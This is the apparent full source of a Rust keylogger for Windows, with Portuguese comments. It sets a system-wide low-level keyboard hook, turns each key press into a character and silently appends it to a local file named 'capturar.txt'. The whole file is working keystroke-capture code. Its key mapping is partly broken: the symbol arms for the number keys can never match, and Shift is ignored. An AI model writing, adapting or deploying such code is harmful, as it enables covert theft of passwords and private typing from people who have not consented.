extern crate winapi;
#[macro_use]
extern crate lazy_static;

use std::fs::OpenOptions;
use std::io::Write;
use std::ptr;
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::Mutex;
use std::thread;
use std::time::Duration;
use winapi::shared::minwindef::{DWORD, LPARAM, LRESULT, WPARAM};
use winapi::um::winuser::{
    CallNextHookEx, GetMessageW, KBDLLHOOKSTRUCT, SetWindowsHookExW, UnhookWindowsHookEx,
    WH_KEYBOARD_LL, WM_KEYDOWN, MSG, HC_ACTION,
};
use winapi::um::libloaderapi::GetModuleHandleW;

lazy_static! {
    static ref SENDER: Mutex<Option<Sender<u32>>> = Mutex::new(None);
}

unsafe extern "system" fn hook_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code == HC_ACTION && w_param as DWORD == WM_KEYDOWN {
        let kb_struct = *(l_param as *const KBDLLHOOKSTRUCT);
        let vk_code = kb_struct.vkCode;
        if let Some(ref sender) = *SENDER.lock().unwrap() {
            let _ = sender.send(vk_code);
        }
    }
    CallNextHookEx(ptr::null_mut(), n_code, w_param, l_param)
}

fn main() {
    let (tx, rx): (Sender<u32>, Receiver<u32>) = mpsc::channel();
    *SENDER.lock().unwrap() = Some(tx);

    thread::spawn(move || {
        let h_instance = unsafe { GetModuleHandleW(ptr::null()) };
        let hook_id = unsafe { SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), h_instance, 0) };

        if hook_id.is_null() {
            eprintln!("Failed to set hook");
            return;
        }

        let mut msg: MSG = unsafe { std::mem::zeroed() };
        while unsafe { GetMessageW(&mut msg, ptr::null_mut(), 0, 0) } != 0 {
            // Do nothing, just keep the thread alive
        }

        unsafe {
            UnhookWindowsHookEx(hook_id);
        }
    });

    thread::spawn(move || {
        let mut file = OpenOptions::new()
            .append(true)
            .create(true)
            .open("capturar.txt")
            .expect("Failed to open file");

            while let Ok(vk_code) = rx.recv() {
                let character = match vk_code {
                    65..=90 => (vk_code as u8) as char, // A-Z
                    48..=57 => (vk_code as u8) as char, // 0-9
                    32 => ' ', // Space
                    13 => '\n', // Enter
                    49 => '!', // VK_1
                    50 => '@', // VK_2
                    51 => '#', // VK_3
                    52 => '$', // VK_4
                    53 => '%', // VK_5
                    54 => '^', // VK_6
                    55 => '&', // VK_7
                    56 => '*', // VK_8
                    57 => '(', // VK_9
                    48 => ')', // VK_0
                    189 => '-', // VK_OEM_MINUS
                    187 => '=', // VK_OEM_PLUS
                    192 => '`', // VK_OEM_3
                    219 => '{', // VK_OEM_OPEN_BRACKETS
                    221 => '}', // VK_OEM_CLOSE_BRACKETS
                    220 => '|', // VK_OEM_PIPE
                    186 => ';', // VK_OEM_SEMICOLON
                    222 => '\'', // VK_OEM_QUOTE
                    188 => ',', // VK_OEM_COMMA
                    190 => '.', // VK_OEM_PERIOD
                    191 => '/', // VK_OEM_SLASH
            
                    // Ignorar Backspace e Tab
                    8 => continue, // Backspace
                    9 => continue, // Tab
                    27 => continue, // Escape
            
                    // Setas e páginas
                    35 => continue, // End
                    36 => continue, // Home
                    37 => continue, // Left Arrow
                    38 => continue, // Up Arrow
                    39 => continue, // Right Arrow
                    40 => continue, // Down Arrow
                    33 => continue, // Page Up
                    34 => continue, // Page Down
            
                    226 => '~', // VK_OEM_102 (geralmente com Shift)
                    _ => continue,
                };
            
                // Escreve o caractere no arquivo
                write!(file, "{}", character).expect("Failed to write to file");
            }
            
            
            
    });

    loop {
        thread::sleep(Duration::from_secs(60));
    }
}
